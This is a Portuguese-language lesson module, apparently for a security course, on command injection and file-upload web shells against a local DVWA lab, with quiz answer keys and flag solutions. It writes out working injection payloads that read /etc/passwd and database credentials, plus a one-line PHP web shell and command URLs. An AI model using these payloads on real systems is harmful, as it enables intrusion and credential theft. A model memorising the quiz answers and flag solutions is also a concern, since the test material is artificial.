@@ -1,0 +1,872 @@
+---
+slug: command-injection-e-upload
+track: trilha-4
+title: "Command Injection e upload de arquivos"
+prerequisites: [sql-injection]
+lab: dvwa
+tasks:
+  - slug: missao-1-injecao
+    title: "Missão 1 — Do ping à leitura de um arquivo do servidor"
+    type: flag
+    prompt: "Depois de explorar a command injection no nível low do DVWA, leia o arquivo de configuração da aplicação (config/config.inc.php). A flag é FLAG{db_user-db_password}: o usuário e a senha do banco, com um hífen entre eles, exatamente como aparecem nesse arquivo."
+    hint: "O campo é um alvo de ping. Anexe um segundo comando com um separador de shell (; ou |). O arquivo fica dois níveis acima da pasta do exercício: ../../config/config.inc.php. Procure as linhas db_user e db_password."
+    flag:
+      hash: "scrypt$16384$8$1$58ca0f6005fe4ae7b1211c986e0194bf54748c78db8db00fdf7be8a1cddf1f24"
+      salt: "f52af476ba5a6f2da074c560dee67a19"
+  - slug: missao-2-upload
+    title: "Missão 2 — Upload de web shell até RCE"
+    type: flag
+    prompt: "Depois de subir uma web shell pelo formulário de upload (nível low) e executá-la, descubra a versão do DVWA (no README.md) e a versão do PHP do servidor. A flag é FLAG{versao-dvwa-versao-php}, as duas unidas por um hífen (ex.: FLAG{9.9.9-9.9.9})."
+    hint: "Suba um .php com <?php system($_GET['cmd']); ?> e acesse-o em /hackable/uploads/. A versão do DVWA está numa linha 'Version:' do /var/www/html/README.md; a versão do PHP sai de 'php -r \"echo PHP_VERSION;\"' (ou de phpversion())."
+    flag:
+      hash: "scrypt$16384$8$1$1c04f043e60980c6507cceb7eea55ba0a36bdf2f9881a8745555e01418587bf8"
+      salt: "79dfd46730c1f4cfea07526fbb2cff4a"
+  - slug: quiz-final
+    title: "Quiz — Command Injection e upload de arquivos"
+    type: quiz
+    passPercent: 70
+    questions:
+      - question: "Qual é a causa-raiz da command injection?"
+        options:
+          - "O sistema operacional tem um bug no comando ping que a distribuição não corrigiu"
+          - "A aplicação monta uma linha de comando concatenando a entrada do usuário e a entrega a um shell, que interpreta os metacaracteres do dado como comando"
+          - "O servidor roda como root e por isso qualquer entrada vira comando"
+          - "O firewall deixou a porta do shell aberta para a internet"
+        answer: 1
+        explanation: "A falha nasce na aplicação, não no ping nem no SO: quando a entrada entra na string que vai para um shell, o shell não distingue dado de comando e um ; ou | digitado vira separador de comandos. Rodar como root piora o impacto, mas não é a causa; o firewall não tem relação."
+      - question: "No nível low do DVWA, o campo de ping monta `ping -c 4 ` concatenado com a sua entrada. Por que `127.0.0.1; cat /etc/passwd` lê o arquivo?"
+        options:
+          - "Porque o ping aceita um arquivo como segundo argumento"
+          - "Porque o `;` separa dois comandos para o shell: ele roda o ping e, em seguida, o `cat /etc/passwd`"
+          - "Porque `cat` é um comando interno do ping"
+          - "Porque o `;` criptografa o resto da linha e o servidor devolve o arquivo"
+        answer: 1
+        explanation: "O `;` é um metacaractere do shell que separa comandos. A linha vira `ping -c 4 127.0.0.1; cat /etc/passwd`: o shell executa o ping e, logo depois, o `cat`, cuja saída aparece junto na página. Nada é criptografado, e `cat` não tem relação com o ping."
+      - question: "Por que subir um arquivo `.php` para uma pasta servida pelo servidor web costuma dar execução remota de código (RCE)?"
+        options:
+          - "Porque todo arquivo enviado é executado automaticamente ao chegar no disco"
+          - "Porque, ao receber um pedido por um arquivo .php, o servidor (Apache/PHP) executa o código dele em vez de devolvê-lo como texto; o atacante então chama o arquivo e roda comandos"
+          - "Porque o navegador executa o PHP ao abrir a página"
+          - "Porque o upload troca a senha do usuário www-data"
+        answer: 1
+        explanation: "A execução acontece quando o atacante REQUISITA o arquivo: o servidor, configurado para tratar .php como código, executa a web shell no lado do servidor (como www-data). O navegador não executa PHP (isso é no servidor); o arquivo não roda sozinho ao ser gravado."
+      - question: "O nível medium do DVWA só aceita o upload se o `Content-Type` for `image/jpeg` ou `image/png`. Por que isso não protege?"
+        options:
+          - "Porque o `Content-Type` é calculado pelo servidor a partir do conteúdo do arquivo"
+          - "Porque o `Content-Type` é enviado pelo cliente na requisição e pode ser forjado (ex.: no Burp) para `image/jpeg` mesmo num arquivo .php"
+          - "Porque imagens JPEG também executam PHP"
+          - "Porque o medium na verdade não checa nada"
+        answer: 1
+        explanation: "O `Content-Type` do upload vem do cliente, no corpo multipart da requisição — e tudo que vem do cliente é forjável. Interceptando no Burp, troca-se o tipo para `image/jpeg` sem mudar o conteúdo .php, e a checagem passa. O servidor não o recalcula a partir do conteúdo."
+      - question: "Qual destas é a defesa CORRETA contra command injection?"
+        options:
+          - "Escapar o `;` com uma blocklist de caracteres perigosos"
+          - "Evitar o shell: chamar o programa diretamente, passando os argumentos como uma lista separada (ex.: execve/`subprocess` sem `shell=True`), sem montar uma string de comando"
+          - "Rodar o comando como um usuário com mais privilégios para ele não falhar"
+          - "Esconder a saída do comando na resposta"
+        answer: 1
+        explanation: "A cura é não entregar uma string a um shell: passar o executável e cada argumento separadamente faz o dado nunca ser reinterpretado como comando. Blocklists de caracteres são contornáveis; aumentar privilégio piora o impacto; esconder a saída não impede a execução (há a versão cega, blind)."
+      - question: "Qual é a defesa mais robusta contra upload que vira RCE?"
+        options:
+          - "Confiar na extensão do arquivo enviada pelo cliente"
+          - "Validar por allowlist (extensão + tipo real pelos magic bytes), renomear o arquivo e guardá-lo fora da raiz web ou numa pasta sem execução de scripts"
+          - "Bloquear só a extensão .php por uma blocklist"
+          - "Limitar o tamanho do arquivo a 100 KB"
+        answer: 1
+        explanation: "Combinar allowlist de tipo (conferindo os magic bytes, não só a extensão/Content-Type), renomear (tirando a extensão controlada pelo atacante) e impedir a execução no diretório de upload ataca a causa de várias formas. Blocklist de extensão tem muitos desvios (.phtml, .php5...); limitar tamanho ou confiar na extensão não protege."
+glossary:
+  - term: shell metacharacters
+    definition: "Caracteres que o shell interpreta de forma especial em vez de tratá-los como texto — como ; | & && || a quebra de linha, $() e crases. São eles que, numa command injection, transformam um dado em um ou mais comandos novos."
+  - term: unrestricted file upload
+    definition: "Unrestricted (ou insecure) file upload: falha em que a aplicação aceita e guarda um arquivo enviado pelo usuário sem validar bem o tipo, o nome ou o conteúdo, permitindo subir código (uma web shell) que o servidor depois executa. É a CWE-434."
+  - term: magic bytes
+    definition: "Os primeiros bytes de um arquivo, que identificam o seu tipo real independentemente da extensão (uma imagem JPEG começa com FF D8 FF, um PNG com 89 50 4E 47). Conferir os magic bytes é mais confiável que confiar na extensão ou no Content-Type."
+  - term: blocklist
+    definition: "Lista de valores proibidos (denylist): o que casa com ela é bloqueado e o resto passa. Como defesa contra injeção é frágil — basta uma variação fora da lista para escapar —, ao contrário da allowlist, que só deixa passar o que é explicitamente permitido."
+---
+
+import fluxoCommandInjection from "./img/fluxo-command-injection.svg";
+import caminhoUploadRce from "./img/caminho-upload-rce.svg";
+
+## 1. Abertura — o que você vai aprender e por quê
+
+Na SQL injection (4.2) você fez a aplicação executar um comando seu — mas num
+banco de dados. Agora o alvo é o próprio sistema operacional do servidor. Existe
+uma classe de falha em que a entrada que você digita vira um comando de
+<GlossaryTerm term="shell">shell</GlossaryTerm> (o interpretador de comandos do
+sistema, como o Bash) rodando na máquina do servidor: é a
+<GlossaryTerm term="command injection">command injection</GlossaryTerm> (injeção
+de comando). E existe um caminho irmão: subir um arquivo que **é** código e fazer
+o servidor executá-lo — o <GlossaryTerm term="unrestricted file upload">upload
+inseguro de arquivos</GlossaryTerm>. Os dois chegam ao mesmo lugar, o pior lugar
+de todos para um defensor: <GlossaryTerm term="remote code execution">execução
+remota de código</GlossaryTerm> (*remote code execution*, RCE), quando o atacante
+roda comandos à vontade no servidor, pela rede.
+
+Por que juntar os dois num módulo? Porque a raiz é a mesma — a que você já viu em
+4.2. Em toda injeção, um canal de **dados** (o que o usuário digita) acaba
+interpretado como um canal de **comandos** (o que o programa executa). Na SQLi,
+o dado vira SQL. Aqui, o dado vira comando de shell, ou vira um arquivo de código
+que o servidor executa. Entender uma injeção é entender todas.
+
+Isto não é teoria de museu. Como você viu em 4.2, a OWASP mantém o **OWASP Top
+10**, a lista das classes de falha web mais críticas; na edição **2021**, a
+categoria *Injection* (CWE-77/CWE-78 para injeção de comando) está em **terceiro**
+lugar, e o upload inseguro (CWE-434) aparece em *Insecure Design* e em *Security
+Misconfiguration*. Os casos da seção 4 — do Shellshock de 2014 a uma CVE de 2024
+explorada contra firewalls — mostram que RCE é o que atacantes mais querem e o
+que mais dói.
+
+**Ao final, você vai saber:**
+
+- explicar por que concatenar a entrada numa linha de comando gera command
+  injection, e reconhecer os <GlossaryTerm term="shell metacharacters">shell
+  metacharacters</GlossaryTerm> que a disparam (`;`, `|`, `&`, `&&`, `` ` ``,
+  `$()`);
+- explorar a command injection do DVWA à mão: do `ping` à leitura de arquivos do
+  servidor, inclusive as credenciais do banco;
+- subir uma <GlossaryTerm term="web shell">web shell</GlossaryTerm> por um
+  formulário de upload e usá-la para executar comandos (RCE);
+- contornar as defesas fracas (checagem de `Content-Type`, de extensão) e
+  entender por que elas falham;
+- remediar as duas falhas com o que de fato funciona: não entregar strings a um
+  shell, e validar uploads por allowlist + conteúdo + isolamento.
+
+**Pré-requisitos:**
+
+- **4.2 — Injeção: SQL Injection:** a ideia-mãe deste módulo (a mistura dos canais
+  de dado e comando) e o hábito de testar uma entrada com um caractere que quebra
+  a sintaxe. De lá você também traz o Burp (interceptar e editar uma requisição),
+  que vamos usar no desafio de upload.
+
+**Tempo estimado:** de 4 a 6 horas, incluindo o laboratório.
+
+<Callout variant="ethics">
+Tudo aqui se faz **só** no laboratório local (o DVWA, vulnerável de propósito e
+sem acesso à internet) ou em um alvo com **autorização por escrito**. Command
+injection e web shell dão controle do servidor: rodá-los contra um sistema de
+terceiros sem autorização é crime no Brasil (art. 154-A do Código Penal, visto na
+Trilha 1), e o estrago é real. A web shell que você vai escrever existe apenas
+dentro do contêiner isolado do lab, e some quando você reseta o alvo.
+</Callout>
+
+## 2. Teoria aprofundada — o conceito por dentro
+
+### 2.1 O shell e seus metacaracteres
+
+Quando um programa precisa rodar outro programa (chamar o `ping`, converter uma
+imagem, compactar um arquivo), ele tem duas opções. A primeira é pedir ao
+<GlossaryTerm term="shell">shell</GlossaryTerm> — o interpretador de comandos do
+sistema, o mesmo Bash que você usou na Trilha 0 — para executar uma **linha de
+comando**. A segunda é chamar o executável diretamente, pelo
+<GlossaryTerm term="system call">system call</GlossaryTerm> do sistema
+operacional, sem passar por um shell. A diferença entre as duas é, veremos, a
+diferença entre ter e não ter a falha.
+
+O shell é poderoso porque não lê a linha como texto puro: ele a **interpreta**.
+Alguns caracteres têm significado especial — são os
+<GlossaryTerm term="shell metacharacters">shell metacharacters</GlossaryTerm>. Os
+que mais importam aqui:
+
+- `;` — separa comandos: `a ; b` roda `a` e depois `b`, sempre;
+- `|` — *pipe*: liga a saída de um comando à entrada do próximo (`a | b`);
+- `&&` e `||` — "e"/"ou" lógicos: `a && b` roda `b` só se `a` der certo;
+- `&` — joga o comando para segundo plano;
+- `` `...` `` e `$(...)` — *command substitution*: roda o que está dentro e
+  coloca a saída ali;
+- uma quebra de linha — também separa comandos.
+
+Guarde a ideia: para o shell, esses caracteres **não são dado**; são estrutura do
+comando. É exatamente o papel que a aspa simples tinha no SQL (4.2).
+
+### 2.2 Onde nasce a command injection
+
+A <GlossaryTerm term="command injection">command injection</GlossaryTerm> nasce
+quando a aplicação monta a linha de comando **concatenando** a entrada do usuário
+e entrega essa string a um shell. É o jeito cômodo e perigoso — o mesmo pecado da
+concatenação de SQL. Veja o código **real** do DVWA no nível `low` (o arquivo
+`vulnerabilities/exec/source/low.php`), a ferramenta que "pinga" um IP que você
+digita:
+
+```php
+$target = $_REQUEST[ 'ip' ];
+// *nix
+$cmd = shell_exec( 'ping  -c 4 ' . $target );
+```
+
+O `shell_exec()` do PHP entrega a string a `/bin/sh`. Se você manda `ip=127.0.0.1`,
+a string vira `ping -c 4 127.0.0.1` e tudo funciona. Mas `$target` pode conter
+**qualquer caractere** — inclusive um `;`. Se você manda `127.0.0.1; cat /etc/passwd`,
+a string montada é:
+
+```text
+ping  -c 4 127.0.0.1; cat /etc/passwd
+```
+
+O shell lê isso como **dois comandos**: o `ping`, e depois o `cat /etc/passwd`. O
+`cat` não tinha nada a ver com a ferramenta — foi você que o anexou, e o shell o
+executou com o mesmo direito do comando legítimo.
+
+<Figure
+  src={fluxoCommandInjection}
+  alt="Duas linhas comparam a mesma aplicação montando um comando de shell por concatenação. Em cima, a entrada benigna 127.0.0.1 vira ping -c 4 127.0.0.1, e o shell devolve a saída do ping. Embaixo, a entrada maliciosa 127.0.0.1; cat /etc/passwd vira ping -c 4 127.0.0.1; cat /etc/passwd; o ponto e vírgula digitado vale como separador de comandos, então o shell roda o ping e também o cat, devolvendo o conteúdo de /etc/passwd. O rodapé explica que o shell recebe uma string única e não distingue o que era dado do que virou comando."
+  caption="A entrada entra na mesma string do comando. Quando ela traz um metacaractere como o ';', o que era dado (o IP) passa a incluir um comando novo. É a mesma mistura de canais da SQL injection, agora no shell."
+/>
+
+### 2.3 A mesma raiz da SQL injection
+
+Por que o shell não percebe o ataque? Pela mesma razão do banco em 4.2: para ele,
+**não há ataque** — há uma linha de comando perfeitamente válida que chegou como
+uma string única. O shell não tem como saber que o trecho `; cat /etc/passwd`
+veio de um campo de formulário e não do programador. Essa informação se perdeu no
+instante em que a aplicação concatenou tudo. Código e dados deveriam viajar por
+canais separados; fundidos numa string, tornam-se indistinguíveis. É o rompimento
+da <GlossaryTerm term="trust boundary">trust boundary</GlossaryTerm> que você vem
+vendo desde 4.1.
+
+### 2.4 A outra via: upload que vira código
+
+Agora o caminho irmão. Quase todo site deixa o usuário enviar arquivos: foto de
+perfil, anexo, comprovante. O <GlossaryTerm term="unrestricted file upload">upload
+inseguro</GlossaryTerm> acontece quando a aplicação guarda esse arquivo sem
+garantir que ele é mesmo inofensivo — e o guarda num lugar onde o servidor
+**executa** código.
+
+A peça-chave é entender o que um servidor web faz com um arquivo `.php`. Quando o
+navegador pede `imagem.jpg`, o Apache devolve os bytes do arquivo. Mas quando pede
+`pagina.php`, o Apache **não** devolve o texto do arquivo: ele entrega o arquivo
+ao PHP, que **executa** o código e devolve só o resultado. Essa é a essência de
+qualquer site em PHP. Logo, se o atacante consegue gravar um `.php` numa pasta
+servida pelo Apache e depois pedir esse arquivo pelo navegador, o código dele roda
+no servidor.
+
+Esse arquivo malicioso é uma <GlossaryTerm term="web shell">web shell</GlossaryTerm>:
+um script que recebe comandos por requisição HTTP e devolve a saída. A menor
+possível em PHP cabe numa linha:
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+Ela pega o parâmetro `cmd` da URL e o executa no sistema. Pedir
+`shell.php?cmd=id` faz o servidor rodar `id` e mostrar o resultado. É
+<GlossaryTerm term="remote code execution">RCE</GlossaryTerm> — e a partir daí o
+atacante lê arquivos, pega credenciais ou abre uma
+<GlossaryTerm term="reverse shell">reverse shell</GlossaryTerm> (2.7) para um
+terminal interativo.
+
+<Figure
+  src={caminhoUploadRce}
+  alt="Cinco passos em sequência: 1) o atacante envia pelo formulário um arquivo shell.php contendo system de dólar GET cmd; 2) o servidor grava o arquivo na pasta pública hackable/uploads sem checar o conteúdo; 3) o atacante acessa pelo navegador a URL dessa pasta com shell.php?cmd=id; 4) o Apache, ao servir um .php, executa o código como o usuário www-data; 5) RCE: o comando roda no servidor e devolve uid=33(www-data). Abaixo, o funil de validação por nível do DVWA: low não checa nada; medium checa o Content-Type, que é forjável; high checa extensão e getimagesize; impossible reconverte a imagem e apaga o código embutido."
+  caption="O upload só vira RCE porque o arquivo é gravado numa pasta que executa PHP e depois é requisitado. A faixa de baixo mostra o que cada nível do DVWA valida — e por onde se escapa."
+/>
+
+### 2.5 O destino comum: RCE
+
+Command injection e upload inseguro são duas portas para a mesma sala: executar
+código no servidor. É o objetivo mais cobiçado de um atacante, porque a partir do
+RCE vem todo o resto — ler o banco, pivotar para a rede interna, escalar
+privilégios (a Trilha 6 inteira). Não por acaso, muitas CVEs de servidores são,
+no fundo, uma destas duas falhas. Por isso elas andam juntas aqui.
+
+## 3. Como o ataque funciona — a mecânica
+
+Esta seção é o passo a passo técnico; na seção 5 você repete no DVWA com a saída
+real. O alvo mental é a página *Command Injection* do DVWA (um "pingador") e o
+formulário *File Upload*.
+
+### Passo 1 — Detectar a command injection
+
+O primeiro teste é anexar um comando com um separador e ver se ele roda. No campo
+de IP, em vez de `127.0.0.1`, envie:
+
+```text
+127.0.0.1; id
+```
+
+Se a página, além do resultado do ping, mostrar algo como
+`uid=33(www-data) gid=33(www-data)`, você tem injeção: o `id` rodou. Se o `;`
+estiver filtrado, tente outros metacaracteres — cada um dá um teste:
+
+```text
+127.0.0.1 | id        # pipe: a saída do ping vai para o id (que a ignora e imprime a identidade)
+127.0.0.1 & id        # & joga o ping para segundo plano e roda o id
+127.0.0.1 && id       # && roda o id se o ping der certo
+127.0.0.1 `id`        # command substitution
+```
+
+### Passo 2 — Reconhecer o terreno
+
+Confirmada a injeção, as primeiras perguntas são: **quem eu sou** e **onde
+estou**. Dois comandos respondem:
+
+```text
+127.0.0.1; id            # qual usuário roda o servidor web (em geral www-data, sem privilégio)
+127.0.0.1; pwd           # em que diretório o script roda
+```
+
+Saber o usuário importa: `www-data` não é root, então você vê só o que ele vê —
+um gancho direto para a escalação de privilégios da Trilha 6.
+
+### Passo 3 — Ler arquivos que interessam
+
+Com RCE, qualquer arquivo que o usuário do servidor possa ler está ao alcance. Os
+clássicos:
+
+```text
+127.0.0.1; cat /etc/passwd                      # a lista de contas do sistema
+127.0.0.1; cat ../../config/config.inc.php      # a configuração da aplicação
+```
+
+O `/etc/passwd` confirma o acesso e lista os usuários. O
+`config.inc.php` costuma ser o troféu: é onde a aplicação guarda as **credenciais
+do banco de dados**. O caminho `../../` sobe dois níveis a partir da pasta do
+exercício (`vulnerabilities/exec/`) até a raiz do site, onde fica `config/`. Isto
+é <GlossaryTerm term="path traversal">path traversal</GlossaryTerm> (subir na
+árvore de diretórios com `..`), que você verá de novo em outras falhas.
+
+### Passo 4 — Detectar e explorar o upload
+
+Na página de upload, o teste é direto: tente subir um arquivo `.php` com uma web
+shell dentro. Se o formulário aceitar e você conseguir acessá-lo em
+`/hackable/uploads/`, é RCE. A web shell mínima:
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+Depois de subir, basta pedir, no navegador do Kali:
+
+```text
+http://dvwa/hackable/uploads/shell.php?cmd=id
+```
+
+e a saída de `id` aparece. Cada comando vai no parâmetro `cmd`. Na seção 5 você
+faz isso de verdade; aqui a ideia é ver que **subir** o arquivo e **executá-lo**
+são dois passos: o upload grava, a requisição executa.
+
+### Passo 5 — Quando há um filtro
+
+Nem sempre o `;` passa, nem sempre o `.php` sobe. A mecânica então vira um jogo de
+descobrir o que o filtro deixa escapar. No DVWA:
+
+- a command injection `medium` apaga `;` e `&&` — mas não o `|`;
+- a `high` apaga quase tudo, menos o `|` **sem espaço** depois;
+- o upload `medium` confia no `Content-Type` enviado — que se forja no Burp;
+- o upload `high` checa a extensão e se o arquivo é imagem de verdade.
+
+Cada um desses é um desafio da seção 6, com a saída real.
+
+## 4. Casos reais — o que aconteceu no mundo
+
+### Shellshock — a command injection que assombrou a internet (2014)
+
+Em **24 de setembro de 2014** veio a público a **CVE-2014-6271**, apelidada de
+*Shellshock*. A falha estava no <GlossaryTerm term="shell">Bash</GlossaryTerm>
+(todas as versões até a 4.3): ao avaliar certas variáveis de ambiente criadas de
+forma especial, o Bash executava o que viesse depois de uma definição de função.
+Como descreve a Red Hat, "um atacante poderia usar essa falha para contornar
+restrições de ambiente e executar comandos de shell". O problema é que servidores
+web clássicos (CGI) passam dados da requisição HTTP — cabeçalhos como o
+`User-Agent` — para o ambiente de scripts; um cabeçalho malicioso virava, assim,
+command injection remota e **sem autenticação**.
+
+- **Impacto:** a Red Hat classificou a CVSS v2 em **7.5**; na prática o efeito era
+  RCE em uma quantidade enorme de servidores Unix/Linux expostos. Ataques
+  começaram **horas** após a divulgação, formando *botnets* para varredura e
+  negação de serviço.
+- **Lição:** command injection não é só um campo de formulário mal feito; qualquer
+  dado que chegue a um shell (até um cabeçalho HTTP) é superfície. A defesa de
+  fundo — não passar dado de fora para um interpretador — vale para todos.
+- **Fonte:** [Red Hat — CVE-2014-6271](https://access.redhat.com/security/cve/cve-2014-6271).
+
+### CVE-2024-3400 — criação de arquivo + command injection = root (2024)
+
+Dez anos depois, a mesma classe continua no topo. Em **12 de abril de 2024**, a
+Palo Alto Networks publicou a **CVE-2024-3400** no recurso GlobalProtect do seu
+sistema PAN-OS (firewalls). O título oficial já conta a história: *"Arbitrary
+File Creation Leads to OS Command Injection"* — **criação arbitrária de arquivo**
+que leva a **injeção de comando**. Ou seja, as duas falhas deste módulo
+**encadeadas**: o atacante primeiro grava um arquivo (o lado do upload) e depois
+faz o conteúdo desse arquivo virar comando do sistema. Resultado, segundo o
+fabricante: "um atacante não autenticado pode executar código arbitrário com
+privilégios de **root** no firewall".
+
+- **Impacto:** nota **CVSS 10.0** (a máxima). A Palo Alto registrou "um número
+  crescente de ataques" explorando a falha, e ela entrou no catálogo de
+  vulnerabilidades exploradas da CISA (KEV). As versões afetadas eram PAN-OS 10.2,
+  11.0 e 11.1 com GlobalProtect.
+- **Lição:** `www-data` do DVWA é sem privilégio, mas num dispositivo de borda a
+  mesma falha roda como root. E repare que escrever um arquivo e injetar um comando
+  não são mundos separados — se combinam no mesmo ataque.
+- **Fonte:** [Palo Alto Networks — CVE-2024-3400](https://security.paloaltonetworks.com/CVE-2024-3400).
+
+### HAFNIUM e as web shells no Exchange (2021)
+
+Para o lado do upload, o caso mais citado é o do **Microsoft Exchange** em
+**2 de março de 2021**. Um grupo (nomeado HAFNIUM pela Microsoft) explorou um
+conjunto de falhas (CVE-2021-26855, -26857, -26858 e -27065) e, segundo a própria
+Microsoft, "após explorar essas vulnerabilidades para obter acesso inicial, os
+operadores do HAFNIUM **implantaram web shells** no servidor comprometido". A web
+shell gravada no disco virava a porta de entrada persistente: por ela os atacantes
+roubavam e-mails, despejavam memória do LSASS e mantinham acesso.
+
+- **Impacto:** dezenas de milhares de organizações foram afetadas no mundo; o
+  episódio levou a uma diretiva de emergência da CISA para corrigir os servidores.
+- **Lição:** a web shell é a materialização do upload inseguro — um arquivo de
+  código que, gravado onde o servidor executa, dá controle duradouro. Detectar
+  arquivos novos e inesperados em diretórios web é defesa de primeira linha.
+- **Fonte:** [Microsoft — HAFNIUM targeting Exchange Servers (02/03/2021)](https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/).
+
+## 5. Mãos à obra — o laboratório guiado
+
+**Objetivo:** ao terminar, você terá explorado as duas falhas no DVWA. Na
+**Missão 1** (command injection), vai sair do "pingador" e chegar a ler o arquivo
+de configuração da aplicação, montando a flag `FLAG{db_user-db_password}` com as
+credenciais do banco. Na **Missão 2** (upload → RCE), vai subir uma web shell,
+executá-la e descobrir a versão do DVWA e do PHP, montando a flag
+`FLAG{versao-dvwa-versao-php}`. Cada missão rende uma flag.
+
+O laboratório é o **`dvwa`**: o Kali e o DVWA (*Damn Vulnerable Web Application*)
+na rede interna `lab_net`. O DVWA é vulnerável de propósito e não alcança nada
+fora do lab.
+
+### 5.1 Subir o lab e preparar (passo a passo)
+
+1. No painel **Laboratório**, no topo desta página, clique em **Iniciar**. Pelo
+   terminal do WSL, a alternativa é `scripts/lab.sh up dvwa`.
+2. Quando o desktop do Kali aparecer, clique nele, abra o **Firefox** e vá a
+   `http://dvwa/login.php`. Entre com `admin` / `password`.
+3. Em **DVWA Security**, escolha **Low** e **Submit**. Começamos pelo nível mais
+   simples; a seção 6 sobe a dificuldade.
+4. Abra **Command Injection**. Há um campo para um IP e um botão **Submit**.
+
+<Callout variant="info" title="Autorização — exercício 4.6 (laboratório local)">
+**Ativo autorizado:** o contêiner `dvwa` do lab local, e somente ele.
+
+**Técnicas autorizadas:** command injection contra o módulo *Command Injection* e
+upload de arquivo contra o módulo *File Upload* do DVWA, pela interface web, a
+partir do Kali do lab.
+
+**Fora do escopo:** qualquer host fora do lab, a rede `desktop_net` (a que carrega
+a sua tela) e técnicas destrutivas. A web shell que você vai subir existe só dentro
+do contêiner e desaparece no **Resetar**.
+</Callout>
+
+### 5.2 Missão 1 — Do ping à leitura de um arquivo (command injection)
+
+**Passo 1 — Pingue normalmente.** Digite `127.0.0.1` e Submit. A página mostra a
+saída de um `ping` comum:
+
+```text
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.044 ms
+...
+4 packets transmitted, 4 received, 0% packet loss, time 3056ms
+```
+
+**Passo 2 — Confirme a injeção.** Agora anexe um segundo comando com `;`:
+
+```text
+127.0.0.1; id
+```
+
+Depois da saída do ping, aparece a identidade do processo do servidor:
+
+```text
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+O `id` rodou. Você tem RCE no DVWA: quem executa é o usuário `www-data` (sem
+privilégio — guarde isso para a Trilha 6).
+
+**Passo 3 — O desafio.** Seu objetivo é **ler o arquivo de configuração da
+aplicação** e tirar dele as credenciais do banco. A flag é
+`FLAG{db_user-db_password}`: o usuário e a senha do banco, com um hífen entre
+eles, **exatamente** como aparecem no arquivo (por exemplo, `FLAG{appuser-s3nh4}`).
+
+Você já sabe anexar um comando. Falta descobrir **onde** está o arquivo e **como**
+lê-lo. Pense em qual comando imprime um arquivo, e lembre que o script roda em
+`vulnerabilities/exec/` — o `config/` está na raiz do site.
+
+<Hint title="Dica 1 — que arquivo, que comando">
+O arquivo é o `config.inc.php`, onde o DVWA guarda a configuração. Para imprimir
+um arquivo use `cat`. Para chegar à raiz do site a partir de `vulnerabilities/exec/`,
+suba dois níveis com `../../`.
+</Hint>
+
+<Hint title="Dica 2 — montando o payload">
+No campo de IP, envie `127.0.0.1; cat ../../config/config.inc.php`. Nas linhas da
+saída, procure `$_DVWA[ 'db_user' ]` e `$_DVWA[ 'db_password' ]`. Os valores entre
+aspas simples (depois do `?:`) são o que vai na flag.
+</Hint>
+
+<Solution title="Solução">
+No campo **IP**, envie:
+
+```text
+127.0.0.1; cat ../../config/config.inc.php
+```
+
+Depois da saída do ping, vêm as linhas do arquivo. As que interessam (saída real
+do lab):
+
+```text
+$_DVWA[ 'db_server' ]   = getenv('DB_SERVER') ?: '127.0.0.1';
+$_DVWA[ 'db_database' ] = getenv('DB_DATABASE') ?: 'dvwa';
+$_DVWA[ 'db_user' ]     = getenv('DB_USER') ?: 'dvwa';
+$_DVWA[ 'db_password' ] = getenv('DB_PASSWORD') ?: 'p@ssw0rd';
+```
+
+O usuário do banco é `dvwa` e a senha é `p@ssw0rd`. Monte a flag no formato
+`FLAG{db_user-db_password}` com esses dois valores, nessa ordem e com o hífen.
+
+Repare no peso disto: por um campo que deveria só pingar um IP, você leu as
+credenciais com que a aplicação fala com o banco. É o pulo do "só um site" para
+"o banco também".
+</Solution>
+
+<FlagInput task="missao-1-injecao" />
+
+### 5.3 Missão 2 — Upload de web shell até RCE
+
+No menu, abra **File Upload**. É um formulário que aceita um arquivo — pensado
+para uma foto. Vamos subir código.
+
+**Passo 1 — Escreva a web shell.** No Kali, abra um editor e crie um arquivo
+`shell.php` com uma única linha:
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+**Passo 2 — Suba o arquivo.** No formulário de upload, escolha `shell.php` e
+clique em **Upload**. No nível `low` não há checagem nenhuma, então a página
+confirma:
+
+```text
+../../hackable/uploads/shell.php succesfully uploaded!
+```
+
+Ela até diz onde o arquivo caiu: `hackable/uploads/`.
+
+**Passo 3 — Execute.** Abra no navegador do Kali, trocando o comando no `cmd`:
+
+```text
+http://dvwa/hackable/uploads/shell.php?cmd=id
+```
+
+A página (em branco, sem o visual do DVWA — é a sua web shell respondendo) mostra:
+
+```text
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+RCE confirmado pela segunda via. Agora é só trocar o `cmd`.
+
+**Passo 4 — O desafio.** Seu objetivo é descobrir, **usando a web shell**, a
+**versão do DVWA** e a **versão do PHP** do servidor. A flag é
+`FLAG{versao-dvwa-versao-php}`, as duas unidas por um hífen (ex.: `FLAG{9.9.9-9.9.9}`).
+
+A versão do DVWA está escrita num arquivo da raiz do site; a do PHP você arranca
+do próprio PHP. Pense em como pedir cada uma pelo `cmd`.
+
+<Hint title="Dica 1 — a versão do DVWA">
+O `README.md` da raiz (`/var/www/html/README.md`) tem uma linha começando por
+`Version:`. Filtre por ela: `cmd=grep -m1 Version /var/www/html/README.md`.
+Lembre de codificar os espaços na URL (`%20`).
+</Hint>
+
+<Hint title="Dica 2 — a versão do PHP">
+O PHP sabe a própria versão. Rode `cmd=php -r "echo PHP_VERSION;"` pela web shell,
+ou use a função `phpversion()`. Alternativa pelo shell: `cmd=php -v`.
+</Hint>
+
+<Solution title="Solução">
+Pela web shell, peça a versão do DVWA:
+
+```text
+http://dvwa/hackable/uploads/shell.php?cmd=grep%20-m1%20Version%20/var/www/html/README.md
+```
+
+```text
+     Version:           23.0.5
+```
+
+E a versão do PHP:
+
+```text
+http://dvwa/hackable/uploads/shell.php?cmd=php%20-r%20%22echo%20PHP_VERSION;%22
+```
+
+```text
+8.5.10
+```
+
+A versão do DVWA é `23.0.5` e a do PHP é `8.5.10`. Monte a flag no formato
+`FLAG{versao-dvwa-versao-php}` com esses dois valores, unidos por um hífen. (Os
+números são os da imagem do lab; se a sua diferir, use os que a sua web shell
+devolver.)
+</Solution>
+
+<FlagInput task="missao-2-upload" />
+
+### 5.4 Desligar o laboratório
+
+Terminou? No painel **Laboratório**, clique em **Parar** (libera a vaga do "um lab
